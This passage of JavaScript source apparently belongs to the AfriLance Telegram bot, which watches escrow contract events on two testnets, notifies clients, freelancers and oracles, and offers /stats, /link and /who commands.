      const safeEnd = Math.max(safeStart, Number(end));

      logs = await provider.getLogs({
        address: escAddr,
        fromBlock: safeStart,
        toBlock: safeEnd,
      });
    } catch (e) {
      const msg = String(e?.message || e).toLowerCase();
      const pruned =
        msg.includes("history has been pruned") ||
        msg.includes("pruned") ||
        msg.includes("missing trie node") ||
        msg.includes("header not found") ||
        e?.code === -32701;

      if (pruned) {
        // ✅ If pruned, jump this escrow cursor forward to (head - SAFE_WINDOW)
        const head = await provider.getBlockNumber().catch(() => end);
        const window = SAFE_WINDOW_BY_CHAIN[chainId] ?? 50_000;
        const jumpTo = Math.max(0, Number(head) - window);

        rec.last_scanned_block = jumpTo;
        await upsertEscrowRow(chainId, escLower, rec);

        console.warn(
          `${chainTag(chainId)} PRUNED logs for ${escAddr}. Jumping escrow cursor to ${jumpTo}`,
        );
        continue;
      }

      console.warn(
        `${chainTag(chainId)} getLogs failed for ${escAddr}:`,
        e?.message || e,
      );
      continue;
    }

    if (logs.length > 0) {
      console.log(
        `${chainTag(chainId)} ${escAddr} fetched ${logs.length} logs (${start}→${end})`,
      );
    }

    for (const log of logs) {
      try {
        await handleLog(chainId, provider, escAddr, log);
      } catch (err) {
        console.error(
          `${chainTag(chainId)} handleLog crashed for ${escAddr}:`,
          err?.message || err,
        );

        // print minimal log identity for debugging
        console.error(
          `${chainTag(chainId)} log meta: tx=${log.transactionHash} idx=${log.logIndex ?? log.index ?? "?"} block=${log.blockNumber}`,
        );

        // continue so watcher can still advance cursors
        continue;
      }
    }

    // advance per-escrow scan cursor after successful scan
    rec.last_scanned_block = end;
    await upsertEscrowRow(chainId, escLower, rec);

    // extra UMA reads when needed
    if (rec && rec.state === 5) {
      await readUmaFieldsIfNeeded(chainId, provider, escAddr, rec);
      await upsertEscrowRow(chainId, escLower, rec);
    }
  }
}

// ===== handleLog =====
async function handleLog(chainId, provider, escAddr, log) {
  let parsed;
  try {
    parsed = escrowIface.parseLog(log);
  } catch {
    return;
  }
  if (!parsed?.name) return;

  const name = parsed.name;
  const escKey = ethers.getAddress(escAddr);
  const key = escKey.toLowerCase();

  const rec = ensureEscrowLocal(chainId, key);

  // ===== LOG DEDUPE (prevents loops / replay spam) =====
  // Unique enough per log: txHash + logIndex
  const logIndex =
    typeof log.index === "number"
      ? log.index
      : typeof log.logIndex === "number"
        ? log.logIndex
        : 0;

  const dedupeKey = `${log.transactionHash || "0x"}:${logIndex}`;

  // keep small rolling memory per escrow
  if (!Array.isArray(rec._recentLogs)) rec._recentLogs = [];

  // if we've already processed this log, skip
  if (rec._recentLogs.includes(dedupeKey)) {
    return;
  }

  // add and trim
  rec._recentLogs.push(dedupeKey);
  if (rec._recentLogs.length > 50) {
    rec._recentLogs = rec._recentLogs.slice(-50);
  }

  if (!rec.client || !rec.freelancer || !rec.oracle) {
    try {
      const c = new ethers.Contract(escAddr, ESCROW_ABI, provider);
      const [client, freelancer, oracle] = await Promise.all([
        c.client().catch(() => null),
        c.freelancer().catch(() => null),
        c.oracle().catch(() => null),
      ]);
      if (client) rec.client = client;
      if (freelancer) rec.freelancer = freelancer;
      if (oracle) rec.oracle = oracle;
    } catch (e) {
      console.warn(`Role fetch failed for ${escAddr} (continuing):`, e.message);
    }
  }

  let tokenSym = "TOKEN";
  let tokenDecimals = 18;

  try {
    const meta = await getSettlementMeta(chainId, provider, escAddr);
    tokenSym = meta.tokenSym;
    tokenDecimals = meta.tokenDecimals;
  } catch {
    // keep defaults
  }

  const where = labelEscrowChain(chainId, escAddr);

  async function persist() {
    await upsertEscrowRow(chainId, key, rec);

    await upsertEscrowPublicRow(chainId, key, rec, {
      blockNumber: log.blockNumber,
      transactionHash: log.transactionHash,
      logIndex:
        typeof log.logIndex === "number"
          ? log.logIndex
          : typeof log.index === "number"
            ? log.index
            : 0,
    });
  }

  function dbgArgs(tag) {
    try {
      const a = Array.from(parsed.args || []).map((x) =>
        x === null ? "null" : x === undefined ? "undefined" : String(x),
      );
      console.log(`${chainTag(chainId)} ${tag} args=`, a);
    } catch {}
  }

  switch (name) {
    case "Deposited": {
      const amount = parsed.args?.[1];
      if (amount == null) {
        dbgArgs("Deposited(null amount)");
        return;
      }
      const amt = ethers.formatUnits(amount, tokenDecimals);

      rec.state = 0;

      await notify(
        rec.tgFreelancerId,
        `Deposit Received 💰 — ${amt} ${tokenSym}\nEscrow: ${where}`,
      );
      await notify(
        rec.tgClientId,
        `You deposited 💰 ${amt} ${tokenSym}\nEscrow: ${where}`,
      );

      await persist();
      break;
    }

    case "FeePaid": {
      const feeAmount = parsed.args?.[1];
      if (feeAmount == null) {
        dbgArgs("FeePaid(null feeAmount)");
        return;
      }

      const fee = ethers.formatUnits(feeAmount, 18);
      const sym = nativeSymbol(chainId);

      rec.state = 0;

      await notify(
        rec.tgFreelancerId,
        `Fee Paid 🤑 — ${fee} ${sym}\nYou can now start the job!\nEscrow: ${where}`,
      );
      await notify(
        rec.tgClientId,
        `You paid the fee 🤑 — ${fee} ${sym}\nFreelancer can start.\nEscrow: ${where}`,
      );

      await persist();
      break;
    }

    case "Started": {
      const [deadline] = parsed.args;

      // deadline is a unix timestamp (seconds)
      const deadlineSec = Number(deadline || 0);
      const whenLocal = deadlineSec
        ? new Date(deadlineSec * 1000).toLocaleString()
        : "—";

      rec.state = 1;
      rec.deadline = deadlineSec;

      // ✅ persist state change first (so frontend updates even if notify fails)
      await persist();

      const msg = `Job Started! 🔥\nExpected completion: *${whenLocal}*\nEscrow: ${where}`;

      // ✅ don’t let a failed notify block the flow
      await Promise.allSettled([
        notify(rec.tgClientId, msg),
        notify(
          rec.tgFreelancerId,
          msg.replace("Job Started!", "You started the job 🔥"),
        ),
      ]);

      break;
    }

    case "Submitted": {
      const [proofHash] = parsed.args;

      rec.state = 2;

      const cid = String(proofHash || "").replace("ipfs://", "");
      const ipfsUrl = cid ? `https://ipfs.io/ipfs/${cid}` : null;

      // ✅ persist state change first
      await persist();

      const clientMsg =
        `Work Submitted! 📄\n\n` +
        `Escrow: ${where}\n` +
        (ipfsUrl ? `\n[View submitted proof](${ipfsUrl})` : "");

      const freelancerMsg = `You submitted proof 📄\nWaiting for client approval/revision request\nEscrow: ${where}`;

      await Promise.allSettled([
        notify(rec.tgClientId, clientMsg),
        notify(rec.tgFreelancerId, freelancerMsg),
      ]);

      break;
    }

    case "Revised": {
      const [messageHash] = parsed.args;
      rec.state = 4;

      await notify(
        rec.tgFreelancerId,
        `Revision Requested 📝\n💬 Revision message: \`${messageHash}\`\nPlease resubmit your work\nEscrow: ${where}`,
      );
      await notify(
        rec.tgClientId,
        `Revision request sent to freelancer 📝\nEscrow: ${where}`,
      );

      await persist();
      break;
    }

    case "Approved": {
      const freelancer = parsed.args?.[0];
      const amount = parsed.args?.[1];

      if (!freelancer || amount == null) {
        dbgArgs("Approved(bad args)");
        return;
      }

      rec.state = 3;

      // ✅ FIX: use `amount`, not `deposit`
      const dep = ethers.formatUnits(amount, tokenDecimals);

      // ✅ persist state change first
      await persist();

      const msgFreelancer = `APPROVED! ✅\nYou received ${dep} ${tokenSym} 💰\nEscrow: ${where}\nThank you!`;

      const msgClient = `Job approved ✅\nPayment released: ${dep} ${tokenSym} 💰\nEscrow: ${where}`;

      // ✅ never let notify failures block completion
      await Promise.allSettled([
        notify(rec.tgFreelancerId, msgFreelancer),
        notify(rec.tgClientId, msgClient),
      ]);

      // ✅ then mark completed (this removes it from active map)
      await markEscrowCompleted(chainId, escAddr);

      break;
    }

    case "Disputed": {
      const [by] = parsed.args;
      rec.state = 5;

      await notify(
        rec.tgClientId,
        `DISPUTE RAISED ⚠️\nEscrow: ${where}\nOracle will review, stay updated on the escrow dashboard.`,
      );
      await notify(
        rec.tgFreelancerId,
        `DISPUTE RAISED ⚠️\nEscrow: ${where}\nOracle will review, stay updated on the escrow dashboard.`,
      );
      await notify(
        rec.tgOracleId || DEFAULT_ORACLE_TG_ID,
        `NEW DISPUTE ⚠️ — REVIEW REQUIRED\nEscrow: ${where}`,
      );
      await notifyAdmins(`DISPUTE ⚠️: ${escAddr}\nBy: \`${by}\``);

      await persist();
      break;
    }

    case "Resolved": {
      const winner = parsed.args?.[0];
      const amount = parsed.args?.[1];

      if (amount == null) {
        dbgArgs("Resolved(null amount)");
        return;
      }

      const amt = ethers.formatUnits(amount, tokenDecimals);

      rec.state = 6;

      await notify(
        rec.tgClientId,
        `Dispute Resolved ✅\nWinner: \`${winner}\` — ${amt} ${tokenSym}\nEscrow: ${where}`,
      );
      await notify(
        rec.tgFreelancerId,
        `Dispute Resolved ✅\nWinner: \`${winner}\` — ${amt} ${tokenSym}\nEscrow: ${where}`,
      );
      await notify(
        rec.tgOracleId || DEFAULT_ORACLE_TG_ID,
        `Dispute Resolved ✅\nWinner: \`${winner}\`\nEscrow: ${where}`,
      );

      // ✅ persist state change BEFORE completing/removing from active cache
      await persist();
      await markEscrowCompleted(chainId, escAddr);
      break;
    }

    default:
      break;
  }
}

// ===== ALL COMMANDS =====
bot.command("stats", async (ctx) => {
  try {
    const userId = ctx.from.id;
    const isPrivileged =
      ADMIN_TG_IDS.includes(String(userId)) ||
      ORACLE_ALERT_TG_IDS.includes(String(userId)) ||
      String(userId) === DEFAULT_ORACLE_TG_ID;

    const now = Math.floor(Date.now() / 1000);

    const rows = allActiveEscrowsFlat();

    const visible = isPrivileged
      ? rows
      : rows.filter(
          ({ rec }) =>
            rec.tgClientId === userId || rec.tgFreelancerId === userId,
        );

    const active = [];
    const completed = [];
    const expired = [];

    for (const { chainId, escLower, rec } of visible) {
      const e = { chainId, addr: ethers.getAddress(escLower), ...rec };

      const isExpired =
        e.state < 2 && e.deadline > 0 && now > e.deadline + 86400 * 3;

      if (e.completed) completed.push(e);
      else if (isExpired) expired.push(e);
      else active.push(e);
    }

    const totalEver = visible.length + db.stats.totalCompleted;

    const format = (e) =>
      `• ${CHAINS[e.chainId]?.name || e.chainId}\n  \`${e.addr}\`\n  [view](${explorerAddr(e.chainId, e.addr)})`;

    let text = isPrivileged
      ? `*GLOBAL ESCROW STATS*\n\n`
      : `*YOUR ESCROW STATS*\n\n`;
    text += `*Total Jobs Ever:* \`${totalEver}\`\n`;
    text += `*Active:* \`${active.length}\` | *Completed:* \`${completed.length + db.stats.totalCompleted}\` | *Expired:* \`${expired.length}\`\n\n`;

    if (active.length)
      text += `*Active Escrows*\n${active.map(format).join("\n")}\n\n`;
    if (completed.length || db.stats.totalCompleted) {
      text += `*Completed Escrows*`;
      if (completed.length)
        text += `\n${completed.slice(-10).map(format).join("\n")}`;
      if (db.stats.totalCompleted > completed.length) {
        text += `\n+ ${db.stats.totalCompleted - completed.length} older completed jobs`;
      }
      text += `\n\n`;
    }
    if (expired.length)
      text += `*Expired (Unfunded)*\n${expired.map(format).join("\n")}\n\n`;

    if (active.length + completed.length + expired.length === 0) {
      text += isPrivileged ? "No escrows yet." : "😏 You have no escrows yet.";
    } else {
      text += `Hard work pays 🤝.`;
    }

    await ctx.reply(text, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
    });
  } catch (err) {
    ctx.reply("Stats temporarily unavailable.");
  }
});

bot.start(async (ctx) => {
  await ctx.reply(
    `*Welcome to AfriLance Bot* 🤝

The main app is now at https://testnet.afrilance.xyz/

To receive Telegram alerts for escrow events (deposits, disputes, approvals), link your Telegram ID using the format below:

\/link <escrowAddress> <yourRole> <yourWalletAddress>

*Link Command Example:*
Client - /link escrowAddress client yourAddress
Freelancer - /link escrowAddress freelancer yourAddress`,
    { parse_mode: "Markdown", disable_web_page_preview: true },
  );
});

bot.command("link", async (ctx) => {
  const parts = ctx.message.text.trim().split(/\s+/).slice(1);

  // Supports:
  // /link <escrow> <client|freelancer|oracle> <address>
  // /link <chain> <escrow> <client|freelancer|oracle> <address>
  if (parts.length < 3) {
    return ctx.reply(
      "Usage: /link [chain] <escrow> <client|freelancer|oracle> <address>",
    );
  }

  let chainId = parseChainArg(parts[0]);
  let esc, role, addr;

  if (chainId) {
    if (parts.length < 4) {
      return ctx.reply(
        "Usage: /link <chain> <escrow> <client|freelancer|oracle> <address>",
      );
    }
    [esc, role, addr] = parts.slice(1);
  } else {
    [esc, role, addr] = parts;
  }

  if (!ethers.isAddress(esc) || !ethers.isAddress(addr))
    return ctx.reply("Invalid address");

  const escKey = ethers.getAddress(esc).toLowerCase();
  const r = String(role || "").toLowerCase();

  if (!["client", "freelancer", "oracle"].includes(r))
    return ctx.reply("Role: client|freelancer|oracle");
  if (r === "oracle" && !ADMIN_TG_IDS.includes(String(ctx.from.id)))
    return ctx.reply("Only admin can link oracle");

  if (!chainId) {
    chainId = await detectChainForEscrow(escKey);
    if (!chainId) {
      return ctx.reply(
        "I couldn't detect the chain for that escrow.\nTry: /link bnb <escrow> <role> <address>\nOr: /link base <escrow> <role> <address>",
      );
    }
  }

  const prov = await getProvider(chainId);
  const currentBlock = await prov.getBlockNumber().catch(() => 0);

  const rec = ensureEscrowLocal(chainId, escKey);

  // wallet for role (optional, but good)
  rec[r] = ethers.getAddress(addr);

  // telegram id for role
  rec["tg" + r.charAt(0).toUpperCase() + r.slice(1) + "Id"] = ctx.from.id;

  // initialize scan anchors so we don't request pruned history
  const anchor = Math.max(currentBlock - 5000, 0);

  if (!rec.created_block || rec.created_block === 0) {
    rec.created_block = anchor; // best guess when user links manually
  }

  if (!rec.last_scanned_block || rec.last_scanned_block === 0) {
    rec.last_scanned_block = anchor;
  }

  await upsertEscrowRow(chainId, escKey, rec);
  await upsertEscrowPublicRow(chainId, escKey, rec, {
    blockNumber: currentBlock,
    fallbackKey: `link:${ctx.from.id}:${currentBlock}`,
  });

  ctx.reply(
    `✅ Linked\n*Chain:* ${CHAINS[chainId]?.name || chainId}\n*Escrow:* ${formatAddress(esc)}\n*Role:* ${r}\n*Wallet:* ${formatAddress(addr)}\n\n*Now you will get escrow event alerts.* 🔔`,
    { parse_mode: "Markdown" },
  );
});

bot.command("who", async (ctx) => {
  const parts = ctx.message.text.trim().split(/\s+/).slice(1);

  // Supports:
  // /who <escrow>
  // /who <chain> <escrow>
  if (parts.length < 1) return ctx.reply("Usage: /who [chain] <escrow>");

  let chainId = parseChainArg(parts[0]);
  let esc = chainId ? parts[1] : parts[0];

  if (!esc || !ethers.isAddress(esc))
    return ctx.reply("Usage: /who [chain] <escrow>");

  const escKey = ethers.getAddress(esc).toLowerCase();

  let matches = [];
  if (chainId) {
    const rec = db.escrowsByChain?.[chainId]?.[escKey];
    if (rec) matches.push({ chainId, rec });
  } else {
    for (const chainIdStr of Object.keys(db.escrowsByChain || {})) {
      const cid = Number(chainIdStr);
      const rec = db.escrowsByChain?.[cid]?.[escKey];
      if (rec) matches.push({ chainId: cid, rec });
    }
  }

  if (matches.length === 0) {
    return ctx.reply(
      "No record for that escrow yet. Link first using /link so the bot knows who to notify.",
    );
  }

  const lines = matches.map(({ chainId, rec }) => {
    const oracleTg = rec.tgOracleId || DEFAULT_ORACLE_TG_ID || "—";
    return (
      `*${escapeMdV2(CHAINS[chainId]?.name || String(chainId))}*\n` +
      `*ESCROW:* ${formatAddress(esc)}\n` +
      `*Client:* ${formatAddress(rec.client)} \\(*tg:* \`${rec.tgClientId || "—"}\`\\)\n` +
      `*Freelancer:* ${formatAddress(rec.freelancer)} \\(*tg:* \`${rec.tgFreelancerId || "—"}\`\\)\n` +
      `*Oracle:* ${formatAddress(rec.oracle)} \\(*tg:* \`${oracleTg}\`\\)\n`
    );
  });

  await ctx.reply(`*WHO GETS NOTIFIED* 🔔\n\n${lines.join("\n")}`, {
    parse_mode: "MarkdownV2",
  });
});

// ===== LAUNCH =====
console.log("AfriLance BOT v9.3 — SUPABASE PERSISTENT");
console.log(`Completed jobs: ${db.stats.totalCompleted}`);

bot
  .launch({ dropPendingUpdates: true })
  .then(() => console.log("AfriLance BOT IS LIVE — UNSTOPPABLE"))
  .catch((err) => console.error("Bot failed to start:", err));

async function watchChain(chainId) {
  const cid = Number(chainId);

  while (true) {
    // ✅ Always get the current provider (so resetProvider() actually rotates)
    let prov;
    try {
      prov = await getProvider(cid);
    } catch (e) {
      console.error(`${chainTag(cid)} provider init failed:`, e?.message || e);
      await sleep(3000);
      continue;
    }

    try {
      const latest = await prov.getBlockNumber();
      const target = Math.max(0, latest - CONFIRMATIONS);

      let { lastBlock: cursor, lastHash: cursorHash } =
        await getChainCursor(cid);

      if (cursor === 0) {
        cursor = Math.max(0, target - 5000);
        const initHash = await getBlockHashSafe(prov, cursor);
        await setChainCursor(cid, cursor, initHash);
        cursorHash = initHash;
      } else if (cursorHash) {
        const liveHash = await getBlockHashSafe(prov, cursor);

        if (liveHash && liveHash !== cursorHash) {
          const rewindTo = Math.max(0, cursor - REORG_REWIND);
          const rewindHash = await getBlockHashSafe(prov, rewindTo);

          console.warn(
            `${chainTag(cid)} REORG detected at cursor=${cursor}. Rewinding to ${rewindTo}`,
          );

          await setChainCursor(cid, rewindTo, rewindHash);
          cursor = rewindTo;
          cursorHash = rewindHash;
        }
      }

      if (cursor >= target) {
        await sleep(POLL_INTERVAL_MS);
        continue;
      }

      const fromBlock = cursor + 1;
      const range = cid === 97 ? 1000 : MAX_RANGE;
      const toBlock = Math.min(target, fromBlock + range - 1);

      console.log(
        `${chainTag(cid)} scanning blocks ${fromBlock} → ${toBlock} (target=${target})`,
      );

      await discoverFactoryJobs(cid, prov, fromBlock, toBlock);
      await processEscrowLogsForRange(cid, prov, fromBlock, toBlock);

      const toHash = await getBlockHashSafe(prov, toBlock);
      await setChainCursor(cid, toBlock, toHash);
    } catch (e) {
      const msg = String(e?.message || e).toLowerCase();
      const pruned =
        msg.includes("history has been pruned") ||
        msg.includes("pruned") ||
        e?.code === -32701;

      if (pruned) {
        const latest = await prov.getBlockNumber().catch(() => 0);
        const target = Math.max(0, latest - CONFIRMATIONS);

        const window = SAFE_WINDOW_BY_CHAIN[cid] ?? 50_000;
        const jumpTo = Math.max(0, target - window);

        console.warn(
          `${chainTag(cid)} RPC pruned history. Jumping cursor forward to ${jumpTo} (target=${target})`,
        );

        const jumpHash = await getBlockHashSafe(prov, jumpTo);
        await setChainCursor(cid, jumpTo, jumpHash);
        await sleep(2000);
        continue;
      }

      // ✅ timeout -> rotate RPC
      if (isRpcTimeout(e)) {
        console.warn(`${chainTag(cid)} RPC timeout. Rotating RPC...`);
        resetProvider(cid);
        await sleep(1500);
        continue;
      }

      console.error(`${chainTag(cid)} watch error:`, e?.message || e);
      await sleep(5000);
    }
  }
}

// start both watchers
watchChain(97);
watchChain(84532);
